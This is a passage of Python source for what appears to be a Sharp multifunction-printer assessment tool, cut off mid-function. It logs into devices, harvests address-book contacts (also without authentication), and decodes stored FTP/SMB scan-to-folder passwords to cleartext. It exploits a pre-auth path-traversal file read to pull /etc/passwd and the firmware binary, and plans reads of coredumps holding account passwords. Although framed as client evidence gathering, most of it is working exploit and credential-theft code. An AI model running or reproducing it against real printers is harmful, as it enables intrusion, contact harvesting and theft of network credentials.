            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
        }

        # STEP 1: fetch the login form for a fresh token2 + session cookie.
        log_request(ctx, "SHARP LOGIN FORM", target.hostport, "GET", login_url, headers)
        try:
            form_resp = http_get(login_url, ctx, headers=headers, allow_redirects=False)
        except RequestException as exc:
            result.outcome = f"ERROR: {exc.__class__.__name__}: {exc}"
            return result

        log_response(ctx, "SHARP LOGIN FORM RESPONSE", target.hostport, form_resp, body_limit=600)

        if form_resp.status_code != 200:
            result.outcome = f"ERROR: HTTP {form_resp.status_code} fetching login form"
            result.status_code = form_resp.status_code
            return result

        form = LoginForm(form_resp.text or "")
        if not form.usable:
            result.outcome = "ERROR: login form not recognised (no password field)"
            result.status_code = form_resp.status_code
            return result

        cookies = parse_set_cookies(form_resp)
        session_id = cookies.get("MFPSESSIONID", "")

        # STEP 2: build the POST body in the order the device's own form posts it.
        data: Dict[str, str] = {}
        role_value = form.role_value(account.username)
        if role_value is not None:
            data[ROLE_SELECT_FIELD] = role_value
        if LOGIN_NAME_FIELD in form.fields:
            # User-authentication mode: the login name is typed, not selected.
            data[LOGIN_NAME_FIELD] = account.username
        data[PASSWORD_FIELD] = account.password
        data["action"] = "loginbtn"
        if form.token:
            data["token2"] = form.token
        data["ordinate"] = "0"
        # Carry through any remaining hidden fields the form declared.
        for name, value in form.fields.items():
            if name in data or name in (PASSWORD_FIELD, LOGIN_NAME_FIELD):
                continue
            if form.field_types.get(name) == "hidden":
                data[name] = value

        post_headers = dict(headers)
        post_headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": target.base_url,
            "Referer": login_url,
        })

        log_request(ctx, "SHARP LOGIN REQUEST", target.hostport, "POST", login_url,
                    post_headers, cookies, data)
        try:
            resp = http_post(login_url, ctx, headers=post_headers, cookies=cookies,
                             data=data, allow_redirects=False)
        except RequestException as exc:
            result.outcome = f"ERROR: {exc.__class__.__name__}: {exc}"
            return result

        log_response(ctx, "SHARP LOGIN RESPONSE", target.hostport, resp, body_limit=800)

        result.status_code = resp.status_code
        location = resp.headers.get("Location", "")
        new_cookies = parse_set_cookies(resp)
        session_id = new_cookies.get("MFPSESSIONID", session_id)

        # A successful Sharp login answers 302 to the requested page and hands
        # back a new MFPSESSIONID. A rejected one re-renders the login form.
        if resp.status_code != 302:
            body = resp.text or ""
            if PASSWORD_FIELD in body:
                result.detail = "login form re-rendered"
            result.outcome = "FAIL"
            return result

        if "login.html" in location.lower() or not location:
            result.detail = f"redirected back to {location or 'login'}"
            result.outcome = "FAIL"
            return result

        result.session = {
            "cookies": {"MFPSESSIONID": session_id} if session_id else new_cookies,
            "base_url": target.base_url,
            "landing": location,
        }

        # STEP 3: confirm the session really is privileged by loading the page
        # the device redirected us to. Contents are inspected, never stored.
        confirmed, detail = self._confirm_session(target, result.session, ctx, location)
        if confirmed is False:
            result.outcome = "FAIL"
            result.detail = detail or "session did not survive redirect"
            return result

        result.outcome = "SUCCESS"
        result.detail = detail or f"302 -> {location}"
        return result

    # ---- export --------------------------------------------------------
    def export_address_book(self, result: LoginResult,
                            ctx: ScanContext) -> Tuple[str, str, Optional[str]]:
        """
        Pull the address book out through System Settings > Data Import/Export.

            GET  /sysmgt_storagebackup_csv.html     -> form + token1/token2
            POST /sysmgt_storagebackup_csv.html
                 action=export_btn&ggt_radio(50)=33 -> 302, Location: the CSV
            GET  <Location>                         -> text/csv attachment
        """
        hostport = result.target.hostport
        session = result.session or {}
        cookies = session.get("cookies") or {}
        if not cookies:
            return hostport, "ERROR: No session data available", None

        base_url = session.get("base_url", result.target.base_url)
        url = f"{base_url}{STORAGE_BACKUP_PATH}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": f"{base_url}/system.html",
        }

        # STEP 1: load the export form for its one-shot tokens.
        log_request(ctx, "SHARP EXPORT FORM", hostport, "GET", url, headers, cookies)
        try:
            page = http_get(url, ctx, headers=headers, cookies=cookies,
                            allow_redirects=False, timeout=ctx.export_timeout)
        except RequestException as exc:
            return hostport, f"ERROR: Export form request failed - {exc.__class__.__name__}: {exc}", None

        log_response(ctx, "SHARP EXPORT FORM RESPONSE", hostport, page, body_limit=400)

        if page.status_code != 200:
            return hostport, f"ERROR: Export form returned HTTP {page.status_code}", None

        form = LoginForm(page.text or "", name="storage_csv_export")
        if not form.fields:
            return hostport, ("ERROR: export form not found - the account may lack "
                              "administrator rights for System Settings"), None

        data: Dict[str, str] = {
            name: value for name, value in form.fields.items()
            if form.field_types.get(name) == "hidden"
        }
        data[EXPORT_RADIO_FIELD] = EXPORT_TYPE_ADDRESS_BOOK
        data["action"] = "export_btn"

        post_headers = dict(headers)
        post_headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": base_url,
            "Referer": url,
        })

        # STEP 2: ask the device to generate the CSV.
        log_request(ctx, "SHARP EXPORT REQUEST", hostport, "POST", url, post_headers, cookies, data)
        try:
            resp = http_post(url, ctx, headers=post_headers, cookies=cookies, data=data,
                             allow_redirects=False, timeout=ctx.export_timeout)
        except RequestException as exc:
            return hostport, f"ERROR: Export failed - {exc.__class__.__name__}: {exc}", None

        log_response(ctx, "SHARP EXPORT RESPONSE", hostport, resp, body_limit=400)

        location = resp.headers.get("Location", "")
        if resp.status_code != 302 or not location:
            return hostport, (f"ERROR: Export request returned HTTP {resp.status_code} "
                              f"instead of a download redirect"), None

        # STEP 3: collect the generated file.
        download_url = location if location.startswith("http") else f"{base_url}{location}"
        log_request(ctx, "SHARP EXPORT DOWNLOAD", hostport, "GET", download_url, headers, cookies)
        try:
            download = http_get(download_url, ctx, headers={**headers, "Referer": url},
                                cookies=cookies, allow_redirects=False,
                                timeout=ctx.export_timeout, max_bytes=16 * 1024 * 1024)
        except RequestException as exc:
            return hostport, f"ERROR: Export download failed - {exc.__class__.__name__}: {exc}", None

        log_response(ctx, "SHARP EXPORT DOWNLOAD RESPONSE", hostport, download, body_limit=200)

        if download.status_code != 200:
            return hostport, f"ERROR: Export download returned HTTP {download.status_code}", None

        body = download.text or ""
        content_type = download.headers.get("Content-Type", "")
        if "csv" not in content_type.lower() and "address" not in body[:200].lower():
            return hostport, ("ERROR: Export download was not a CSV "
                              f"(Content-Type: {content_type or 'unset'})"), None

        safe_filename = hostport.replace(":", "_").replace("/", "_")
        output_file = f"{ctx.output_dir}/addressbook_{self.name}_{safe_filename}.csv"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(body)

        entries = max(0, len([line for line in body.splitlines() if line.strip()]) - 1)
        return hostport, f"SUCCESS: Exported {entries} entry/entries to {output_file}", output_file

    # ---- unauthenticated harvest ---------------------------------------
    def scrape_contacts(self, target: Target, ctx: ScanContext,
                        session: Optional[Dict] = None) -> Tuple[List[str], List[str], str]:
        """
        Read the address book straight off /addressbook.html.

        Plenty of Sharp MFPs render the full contact table to anonymous
        visitors, so this is the fallback when the default credentials do not
        work or the CSV export is unavailable. Any session we already hold is
        reused, but none is required.

        The page size cannot be changed without an administrative session, so a
        device with more contacts than fit on one page yields only that page.
        The returned message always states how many of the device's declared
        total were actually collected, so a short read is never silent.
        """
        url = f"{target.base_url}{ADDRESS_BOOK_PATH}"
        cookies = (session or {}).get("cookies") or {}
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

        log_request(ctx, "SHARP ADDRESS BOOK", target.hostport, "GET", url, headers, cookies)
        try:
            resp = http_get(url, ctx, headers=headers, cookies=cookies,
                            allow_redirects=False, timeout=ctx.export_timeout,
                            max_bytes=16 * 1024 * 1024)
        except RequestException as exc:
            return [], [], f"ERROR: {exc.__class__.__name__}: {exc}"

        log_response(ctx, "SHARP ADDRESS BOOK RESPONSE", target.hostport, resp, body_limit=300)

        if resp.status_code == 302:
            dest = resp.headers.get("Location", "")
            if "login" in dest.lower():
                return [], [], "SKIPPED: address book requires authentication"
            return [], [], f"SKIPPED: redirected to {dest}"
        if resp.status_code != 200:
            return [], [], f"ERROR: HTTP {resp.status_code}"

        body = resp.text or ""
        if PASSWORD_FIELD in body or page_title(body).lower().startswith("login"):
            return [], [], "SKIPPED: address book requires authentication"

        # Keep the device's session so page state survives across requests.
        cookies = dict(cookies)
        for name, value in parse_set_cookies(resp).items():
            cookies.setdefault(name, value)

        total, page, pages = read_pagination(body)
        entries = parse_address_table(body)
        if total == 0 or not entries:
            return [], [], "No address book entries on this device"

        collected: List[Tuple[str, str, str]] = []
        seen = set()
        for row in entries:
            if row[2] not in seen:
                seen.add(row[2])
                collected.append(row)

        # Widen the page before walking it - one request for 100 rows beats ten
        # requests for 10. The page size is a form control like any other, so
        # this works unauthenticated too.
        if total is not None and len(collected) < total and pages > 1:
            biggest = largest_page_size(body)
            if biggest:
                widened = self._post_list(url, cookies, ctx, body, headers,
                                          action=PAGE_SIZE_FIELD,
                                          overrides={PAGE_SIZE_FIELD: biggest})
                if widened:
                    rows = parse_address_table(widened)
                    if len(rows) > len(collected):
                        body = widened
                        total, page, pages = read_pagination(body)
                        collected, seen = [], set()
                        for row in rows:
                            if row[2] not in seen:
                                seen.add(row[2])
                                collected.append(row)

        # Walk whatever is left with the Next button.
        walked = 0
        while (total is not None and len(collected) < total and page < pages
               and walked < MAX_PAGE_WALK):
            walked += 1
            next_body = self._post_list(url, cookies, ctx, body, headers, action=NEXT_ACTION)
            if not next_body:
                break
            next_total, next_page, next_pages = read_pagination(next_body)
            if next_page == page:
                break                      # the device did not advance; stop rather than loop
            body, page, pages = next_body, next_page, next_pages
            if next_total is not None:
                total = next_total
            for row in parse_address_table(body):
                if row[2] not in seen:
                    seen.add(row[2])
                    collected.append(row)

        emails = [email for _name, email, _row_id in collected if email]
        names = [name for name, _email, _row_id in collected if name]

        if total is None:
            message = f"SUCCESS: Harvested {len(collected)} entry/entries"
        elif len(collected) < total:
            message = (f"PARTIAL: Harvested {len(collected)} of {total} entry/entries "
                       f"(stopped on page {page} of {pages})")
        else:
            message = f"SUCCESS: Harvested {len(collected)} of {total} entry/entries"
        return emails, names, message

    def _post_list(self, url: str, cookies: Dict, ctx: ScanContext, page_html: str,
                   headers: Dict, action: str,
                   overrides: Optional[Dict[str, str]] = None) -> Optional[str]:
        """
        Re-submit the address book form the way the page's own validate() does:
        every current field, plus `action` naming the control that fired. The
        CSRF token is re-read from the page being submitted, since it is
        single use.
        """
        data = list_form_state(page_html)
        if not data:
            return None
        if overrides:
            data.update(overrides)
        data["action"] = action
        data["ordinate"] = "0"

        post_headers = dict(headers)
        post_headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": url.rsplit("/", 1)[0],
            "Referer": url,
        })
        try:
            resp = http_post(url, ctx, headers=post_headers, cookies=cookies, data=data,
                             allow_redirects=False, timeout=ctx.export_timeout,
                             max_bytes=16 * 1024 * 1024)
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if not location:
                    return None
                target = location if location.startswith("http") else url.rsplit("/", 1)[0] + location
                resp = http_get(target, ctx, headers=headers, cookies=cookies,
                                allow_redirects=False, timeout=ctx.export_timeout,
                                max_bytes=16 * 1024 * 1024)
        except RequestException:
            return None
        if resp.status_code != 200:
            return None
        return resp.text or ""

    # ---- contact extraction --------------------------------------------
    def extract_contacts(self, text: str) -> Tuple[List[str], List[str]]:
        """
        Sharp exports a quoted CSV whose first row names the columns, e.g.
        address, search-id, name, ..., mail-address, fax-number, ftp-host, ...

        Columns are looked up by name rather than position, since the set varies
        with firmware and with which destination types the device supports.
        """
        content = (text or "").lstrip("\ufeff")
        if not content.strip():
            return [], []

        try:
            rows = list(csv.reader(io.StringIO(content)))
        except csv.Error:
            return EMAIL_RE.findall(content), []
        if not rows:
            return [], []

        header = [column.strip().strip('"').lower() for column in rows[0]]
        name_idx = header.index("name") if "name" in header else None
        mail_idx = header.index("mail-address") if "mail-address" in header else None

        if name_idx is None and mail_idx is None:
            # Unrecognised layout - fall back to scraping addresses out of it.
            return EMAIL_RE.findall(content), []

        emails: List[str] = []
        names: List[str] = []
        for row in rows[1:]:
            if mail_idx is not None and len(row) > mail_idx:
                value = row[mail_idx].strip()
                if value and "@" in value:
                    emails.append(value)
            if name_idx is not None and len(row) > name_idx:
                value = row[name_idx].strip()
                if value:
                    names.append(value)
        return emails, names

    def extract_scan_to_folder(self, text: str) -> List[Dict[str, str]]:
        """
        Pull scan-to-folder destinations out of the exported address book CSV.

        Columns are grouped by protocol prefix (ftp-*, smb-*, ...) and located by
        name, since firmware only emits the groups for destination types the
        device actually supports. A row counts as a folder destination once any
        host, path, or username column for a protocol is populated.

        The stored password is carried out in cleartext. Sharp exports it in
        the "<proto>-password" column with a companion
        "<proto>-password/@encodingMethod" column naming the encoding, so the
        value is decoded here rather than left for someone to work out by hand
        later. ``has_password`` is still reported for callers that only want
        the presence signal.
        """
        content = (text or "").lstrip("\ufeff")
        if not content.strip():
            return []
        try:
            rows = list(csv.reader(io.StringIO(content)))
        except csv.Error:
            return []
        if len(rows) < 2:
            return []

        header = [column.strip().strip('"').lower() for column in rows[0]]
        index = {name: i for i, name in enumerate(header)}

        def cell(row: List[str], column: str) -> str:
            # The header index is lower-cased, so the lookup has to be too:
            # the companion column is spelled "<field>/@encodingMethod" and
            # would otherwise never match.
            i = index.get(column.lower())
            if i is None or i >= len(row):
                return ""
            return row[i].strip()

        def first(row: List[str], prefix: str, suffixes: Tuple[str, ...]) -> str:
            for suffix in suffixes:
                value = cell(row, f"{prefix}-{suffix}")
                if value:
                    return value
            return ""

        def first_with_column(row: List[str], prefix: str,
                              suffixes: Tuple[str, ...]) -> Tuple[str, str]:
            """
            As first(), but also returns the column name that produced the
            value - the encodingMethod column is named after it
            ("ftp-password" -> "ftp-password/@encodingMethod"), so the caller
            cannot look up the encoding without knowing which column hit.
            """
            for suffix in suffixes:
                column = f"{prefix}-{suffix}"
                value = cell(row, column)
                if value:
                    return value, column
            return "", ""

        findings: List[Dict[str, str]] = []
        for row in rows[1:]:
            entry_name = cell(row, "name")
            for label, prefix in SCAN_FOLDER_PROTOCOLS:
                host = first(row, prefix, _FOLDER_HOST_COLS)
                path = first(row, prefix, _FOLDER_PATH_COLS)
                user = first(row, prefix, _FOLDER_USER_COLS)
                if not (host or path or user):
                    continue
                stored, column = first_with_column(row, prefix, _FOLDER_PASS_COLS)
                encoding = cell(row, f"{column}/@encodingMethod") if column else ""
                password, note = _decode_export_value(stored, encoding)
                findings.append({
                    "name": entry_name,
                    "protocol": label,
                    "host": host,
                    "path": path,
                    "username": user,
                    "has_password": "yes" if stored else "no",
                    "password": password,
                    "password_encoding": encoding,
                    "password_note": note,
                })
        return findings

    def _confirm_session(self, target: Target, session: Dict, ctx: ScanContext,
                         location: str) -> Tuple[Optional[bool], str]:
        """
        Follow the post-login redirect once. Returns (True, detail) if the page
        loads as an authenticated view, (False, detail) if we were bounced back
        to the login form, or (None, detail) if the check itself failed.
        """
        url = location if location.startswith("http") else f"{target.base_url}{location}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": f"{target.base_url}{LOGIN_PATH}",
        }
        log_request(ctx, "SHARP SESSION CHECK", target.hostport, "GET", url,
                    headers, session.get("cookies", {}))
        try:
            resp = http_get(url, ctx, headers=headers,
                            cookies=session.get("cookies", {}), allow_redirects=False)
        except RequestException as exc:
            return None, f"confirmation request failed: {exc.__class__.__name__}"

        log_response(ctx, "SHARP SESSION CHECK RESPONSE", target.hostport, resp, body_limit=400)

        body = resp.text or ""
        title = page_title(body)
        if resp.status_code == 302:
            dest = resp.headers.get("Location", "")
            if "login.html" in dest.lower():
                return False, "session rejected (bounced to login.html)"
            return None, f"confirmation redirected to {dest}"
        if resp.status_code != 200:
            return None, f"confirmation returned HTTP {resp.status_code}"
        if PASSWORD_FIELD in body or title.lower().startswith("login"):
            return False, "session rejected (login form returned)"
        return True, f"authenticated as {title or location}"

    # ---- vulnerability checks -----------------------------------------
    def check_vulnerabilities(self, target: Target, ctx: ScanContext,
                              login_result: Optional[LoginResult] = None,
                              include_advisories: bool = False) -> List[VulnFinding]:
        """
        Findings from Pierre Kim's June 2024 Sharp MFP advisory bundle.

        Default output is zero-false-positive. Two verified checks run:

          * The pre-auth LFI probe reads /etc/passwd through
            /installed_emanual_down.html. A byte-level match on ``root:*:0:0:``
            is the proof.
          * When the LFI probe succeeds, the same primitive fetches
            /tmp/main/main and greps for the exact hardcoded Google OAuth
            client IDs and AWS analytics key strings the advisory calls out.
            A byte-for-byte match on this specific device's binary is the
            proof; misses do not produce a finding.

        Three CVEs cannot be actively verified without an exploit that
        would crash, reboot, reconfigure, or otherwise touch the printer's
        live state (CVE-2024-28038 memory corruption, CVE-2022-45796 IPv6
        command injection, CVE-2024-34162 LDAP downgrade). They are
        suppressed by default and re-enabled with ``include_advisories=True``
        for internal triage.
        """
        findings: List[VulnFinding] = []

        try:
            confirmed_lfi = self._check_pre_auth_lfi(target, ctx)
        except Exception:
            confirmed_lfi = None
        if confirmed_lfi:
            findings.append(confirmed_lfi)
            # Chain: the same LFI reads /tmp/main/main. Grep for the exact
            # hardcoded secrets and emit a verified finding per hit.
            try:
                findings.extend(self._verify_hardcoded_secrets(target, ctx))
            except Exception:
                pass

        if include_advisories:
            admin_default_worked = bool(
                login_result and login_result.ok
                and login_result.account.username.lower() == "administrator"
            )
            # If the binary chain already produced verified rows for the
            # Google or AWS secrets, don't shadow them with an advisory row.
            verified_cves = {f.cve for f in findings}
            findings.append(self._advisory_pre_auth_memory_corruption())
            if "CVE-2024-36248" not in verified_cves:
                findings.append(self._advisory_hardcoded_google_keys())
            if "no-CVE (hardcoded AWS analytics key)" not in verified_cves:
                findings.append(self._advisory_hardcoded_aws_keys())
            findings.append(self._advisory_ipv6_command_injection(admin_default_worked))
            findings.append(self._advisory_ldap_downgrade(admin_default_worked))

        return findings

    def _verify_hardcoded_secrets(self, target: Target,
                                  ctx: ScanContext) -> List[VulnFinding]:
        """
        Chain the pre-auth LFI to a byte-for-byte proof of the hardcoded
        Google OAuth client IDs and AWS analytics key. Only runs after the
        /etc/passwd probe has already confirmed traversal works.

        The read is capped at 32 MB and streamed. If the response is not a
        real binary (device patched the endpoint, or the file was renamed
        between firmware versions), no finding is emitted - a miss on this
        chain must never masquerade as a hit.
        """
        url = f"{target.base_url}{LFI_PATH}?path={MAIN_BINARY_PATH_ARG}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        log_request(ctx, "SHARP LFI BINARY CHAIN", target.hostport, "GET", url, headers)
        try:
            resp = http_get(url, ctx, headers=headers, allow_redirects=False,
                            max_bytes=MAIN_BINARY_MAX_BYTES,
                            timeout=ctx.export_timeout)
        except RequestException:
            return []
        log_response(ctx, "SHARP LFI BINARY CHAIN RESPONSE",
                     target.hostport, resp, body_limit=120)

        if resp.status_code != 200:
            return []
        body = resp.content or b""
        # ELF magic is the cheapest sanity check that we actually pulled a
        # binary and not a 200-OK error page that happens to be small.
        if not body.startswith(b"\x7fELF") and len(body) < 4096:
            return []

        findings: List[VulnFinding] = []
        google_hits: List[Tuple[str, int]] = [
            (cid.decode(), body.find(cid))
            for cid in GOOGLE_CLIENT_IDS if cid in body
        ]
        aws_hits: List[Tuple[str, int]] = []
        for marker in (AWS_API_KEY, AWS_POSTMAN_TOKEN, AWS_ANALYTICS_ENDPOINT):
            if marker in body:
                aws_hits.append((marker.decode(), body.find(marker)))

        if google_hits:
            evidence_path = _write_evidence(
                ctx, target, "evidence_google_keys",
                _render_binary_excerpts(
                    target, url, body, google_hits,
                    subject="Hardcoded Google OAuth client IDs (CVE-2024-36248)",
                ).encode("utf-8", errors="replace"),
            )
            findings.append(VulnFinding(
                cve="CVE-2024-36248",
                title="Hardcoded Google OAuth client IDs in the main firmware binary",
                severity="medium",
                verified=True,
                evidence_path=evidence_path,
                output=(
                    "Verified on this device: fetched /tmp/main/main through the "
                    "pre-auth LFI and matched the following Google OAuth client "
                    f"ID(s) verbatim in the binary: {'; '.join(v for v, _o in google_hits)}. "
                    "The reporter notes these registrations are no longer used by "
                    "Sharp and are free for anyone to claim, so any device attempt "
                    f"to reach them is receivable by an attacker who registers them. "
                    f"Proof-of-concept saved to {evidence_path} (offsets + hex + ASCII "
                    f"context around each match). Apply the firmware update per "
                    f"{SHARP_ADVISORY} and block outbound traffic to the listed hosts."
                ),
            ))
        if aws_hits:
            evidence_path = _write_evidence(
                ctx, target, "evidence_aws_keys",
                _render_binary_excerpts(
                    target, url, body, aws_hits,
                    subject="Hardcoded AWS analytics key/token/endpoint (no-CVE)",
                ).encode("utf-8", errors="replace"),
            )
            findings.append(VulnFinding(
                cve="no-CVE (hardcoded AWS analytics key)",
                title="Hardcoded AWS API key and analytics endpoint in the main firmware binary",
                severity="medium",
                verified=True,
                evidence_path=evidence_path,
                output=(
                    "Verified on this device: fetched /tmp/main/main through the "
                    "pre-auth LFI and matched the following hardcoded value(s) "
                    f"verbatim in the binary: {'; '.join(v for v, _o in aws_hits)}. "
                    "The binary uses these to POST device analytics with 'curl -k' "
                    "(TLS certificate validation disabled). Any actor who recovers "
                    "the keys can impersonate a printer or, by MITM'ing the "
                    "analytics endpoint, receive traffic from every device. "
                    f"Proof-of-concept saved to {evidence_path} (offsets + hex + "
                    "ASCII context around each match). Apply the firmware update per "
                    f"{SHARP_ADVISORY} and block outbound traffic to the listed endpoint."
                ),
            ))
        return findings

    def _check_pre_auth_lfi(self, target: Target, ctx: ScanContext) -> Optional[VulnFinding]:
        """
        Pre-authenticated arbitrary file read (Pierre Kim, June 2024, non-CVE section).

        The handler at /installed_emanual_down.html reads whichever file is named
        in the ``path=`` argument, and no traversal check is applied to the
        segments preceding /manual/. ``GET /installed_emanual_down.html?path=
        /manual/../../../etc/passwd`` returns the printer's Linux passwd file
        without a session cookie. We probe with /etc/passwd because it is small,
        harmless, unmistakably formatted, and never contains user data - we
        specifically do NOT reach for /mnt/log/core-main.log.gz.001 (coredumps
        holding cleartext user passwords) or /mnt/std04/DBMS/uaccnt (user
        credential database), which is where the real attack goes.

        On a hit, the exact response body is persisted to disk as the client's
        proof-of-concept artifact.
        """
        url = f"{target.base_url}{LFI_PATH}?path={LFI_PROBE_PATH_ARG}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        log_request(ctx, "SHARP LFI PROBE", target.hostport, "GET", url, headers)
        try:
            resp = http_get(url, ctx, headers=headers, allow_redirects=False,
                            max_bytes=32 * 1024)
        except RequestException:
            return None
        log_response(ctx, "SHARP LFI PROBE RESPONSE", target.hostport, resp, body_limit=300)

        if resp.status_code != 200:
            return None
        body = resp.text or ""
        if not _LFI_PASSWD_RE.search(body):
            return None

        # Persist the raw /etc/passwd bytes so the client can reproduce the
        # finding without re-running the tool.
        evidence_header = (
            f"# Sharp MFP pre-auth LFI evidence\n"
            f"# Target: {target.base_url}\n"
            f"# Request: GET {LFI_PATH}?path={LFI_PROBE_PATH_ARG}\n"
            f"# Response: HTTP {resp.status_code}, "
            f"Content-Type: {resp.headers.get('Content-Type', 'unset')}\n"
            f"# Length: {len(body)} bytes\n"
            f"# --- verbatim response body follows ---\n"
        )
        evidence_path = _write_evidence(
            ctx, target, "evidence_lfi",
            (evidence_header + body).encode("utf-8", errors="replace"),
        )

        return VulnFinding(
            cve="no-CVE (pre-auth LFI)",
            title="Unauthenticated arbitrary file read via /installed_emanual_down.html path traversal",
            severity="critical",
            verified=True,
            evidence_path=evidence_path,
            output=(
                "Unauthenticated Local File Inclusion confirmed on this device: "
                f"GET {LFI_PATH}?path={LFI_PROBE_PATH_ARG} returned the printer's "
                "/etc/passwd (matched root:*:0:0: pattern). The same primitive reads "
                "coredump files under /mnt/log/core-main.log.gz.* (which store "
                "clear-text passwords for every user account, including Administrator, "
                "Service and FSS User) and the user database under "
                "/mnt/std04/DBMS/uaccnt/, so this finding chains directly to full "
                "credential compromise of the printer. "
                f"Proof-of-concept saved to {evidence_path} (verbatim response body). "
                f"Apply the vendor firmware update per {SHARP_ADVISORY}. "
                "Reference: Pierre Kim, \"Sharp MFP - 17 vulnerabilities\", 2024-06-27."
            ),
        )

    # ---- credential recovery -------------------------------------------

    def recover_credentials(self, target: Target, ctx: ScanContext,
                            login_result: Optional[LoginResult] = None,
                            export_text: str = "") -> List[RecoveredCredential]:
        """
        Recover the credentials this device stores, in cleartext.

        Three sources, run cheapest first and independently - a device that
        blocks one still gives up the others:

          1. **The address book CSV** already pulled in the harvest stage.
             Sharp exports the stored FTP/SMB/Desktop passwords for every
             scan-to-folder destination, encoded per the companion
             ``@encodingMethod`` column. No extra request.
          2. **The LDAP settings page** (``/nw_ldap_entry.html?ldapid=N``),
             read with the administrator session when we have one. Yields the
             directory server, the bind account, and - on firmware that
             renders stored values back into the form - the bind password.
          3. **The printer's coredumps**, through the pre-auth LFI. Per the
             June 2024 advisory these are world-readable under /mnt/log and
             hold cleartext passwords for every account. This is the source
             that still works when the default credentials have been changed
             and no session was obtained at all.

        Every returned credential is labelled ``verified`` (it came out of a
        field whose meaning is unambiguous), ``candidate`` (a pattern match
        over raw memory), or ``config-only`` (the account and where it points
        were recovered, the password was not).
        """
        recovered: List[RecoveredCredential] = []

        for stage in (
            lambda: self._recover_from_export(target, export_text),
            lambda: self._recover_ldap_settings(target, ctx, login_result),
            lambda: self._recover_from_memory(target, ctx),
        ):
            try:
                recovered.extend(stage())
            except Exception as exc:
                # One unhappy device must not cost the operator the other two
                # sources, nor take the scan down.
                if ctx.verbose:
                    print(f"[SHARP RECOVERY] {target.hostport}: stage failed - "
                          f"{exc.__class__.__name__}: {exc}")

        return self._dedupe_credentials(recovered)

    @staticmethod
    def _dedupe_credentials(items: List[RecoveredCredential]) -> List[RecoveredCredential]:
        """
        Collapse the same credential arriving from more than one source.

        A scan-to-folder password can turn up in both the CSV and the coredump;
        reporting it twice pads the findings file without adding information.
        Keyed on the triple that makes a credential distinct, and the better
        confidence wins so a structured hit is never demoted by a memory grep.
        """
        rank = {"verified": 3, "candidate": 2, "config-only": 1}
        best: Dict[Tuple[str, str, str], RecoveredCredential] = {}
        for item in items:
            key = (item.kind, item.username.lower(), item.password)
            current = best.get(key)
            if current is None or rank.get(item.confidence, 0) > rank.get(current.confidence, 0):
                best[key] = item

        # A config-only row says "this account exists here, the password did not
        # come back". Once another source has produced that same account's
        # password, the config-only row is only noise in the findings file, so
        # fold its detail into the row that carries the secret and drop it.
        with_password = {
            (item.kind, item.username.lower())
            for item in best.values() if item.password
        }
        merged: List[RecoveredCredential] = []
        for item in best.values():
            identity = (item.kind, item.username.lower())
            if not item.password and identity in with_password:
                for other in best.values():
                    if (other.kind, other.username.lower()) == identity and other.password:
                        extra = f"config from {item.source}: {item.detail}" if item.detail else ""
                        if extra and extra not in other.detail:
                            other.detail = f"{other.detail}; {extra}" if other.detail else extra
                        # The settings page is the authority on where the
                        # account is actually used; a memory hit only guessed.
                        if item.scope and item.scope.startswith("ldap://"):
                            other.scope = item.scope
                        break
                continue
            merged.append(item)
        return merged

    def _recover_from_export(self, target: Target,
                             export_text: str) -> List[RecoveredCredential]:
        """
        Lift the scan-to-folder credentials straight out of the exported CSV.

        These are the ones worth having: a scan-to-folder destination exists so
        the MFP can write into a share unattended, which means the account is
        real, it is usually a service account, and it usually has write access.
        """
        out: List[RecoveredCredential] = []
        for folder in self.extract_scan_to_folder(export_text):
            password = folder.get("password") or ""
            username = folder.get("username") or ""
            if not (password or username):
                continue

            host = (folder.get("host") or "").rstrip("/")
            path = (folder.get("path") or "").lstrip("/")
            protocol = folder.get("protocol") or "folder"
            if host and path:
                scope = f"{protocol.lower()}://{host}/{path}"
            elif host:
                scope = f"{protocol.lower()}://{host}"
            else:
                scope = path or "(destination on this device)"

            detail_bits = [f"address book entry '{folder.get('name') or '(unnamed)'}'"]
            if folder.get("password_encoding"):
                detail_bits.append(f"stored with encodingMethod="
                                   f"{folder['password_encoding']}")
            if folder.get("password_note"):
                detail_bits.append(folder["password_note"])

            out.append(RecoveredCredential(
                kind="scan-to-folder",
                scope=scope,
                username=username,
                password=password,
                source=(f"{protocol} destination in the address book CSV exported through "
                        f"System Settings > Data Import/Export on {target.hostport}"),
                detail="; ".join(detail_bits),
                confidence="verified" if password else "config-only",
            ))
        return out

    def _recover_ldap_settings(self, target: Target, ctx: ScanContext,
                               login_result: Optional[LoginResult]) -> List[RecoveredCredential]:
        """
        Read the configured LDAP servers off /nw_ldap_entry.html?ldapid=N.

        Needs an administrator session, so this stage is skipped silently when
        the default credentials did not work - the coredump route covers that
        case instead. Fields are classified by the label the device renders
        beside each box rather than by ggt_textbox() id, because the ids move
        between firmware families while the labels do not.
        """
        if not (login_result and login_result.ok):
            return []
        session = login_result.session or {}
        cookies = session.get("cookies") or {}
        if not cookies:
            return []
        base_url = session.get("base_url", target.base_url)

        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": f"{base_url}/network.html",
        }

        out: List[RecoveredCredential] = []
        for ldap_id in range(LDAP_MAX_ENTRIES):
            url = f"{base_url}{LDAP_ENTRY_PATH}?ldapid={ldap_id}"
            log_request(ctx, "SHARP LDAP SETTINGS", target.hostport, "GET", url,
                        headers, cookies)
            try:
